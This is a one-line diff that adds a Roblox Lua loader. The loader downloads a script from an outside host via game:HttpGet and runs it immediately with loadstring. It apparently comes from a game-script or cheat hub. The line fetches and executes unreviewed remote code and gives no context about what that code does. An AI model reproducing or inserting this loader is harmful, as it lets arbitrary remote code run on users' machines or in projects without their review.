@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://testedhub.dev/releases/9A1A6BDCFDD6291A61F5B6A75E5F171301DCEF97.txt"))()
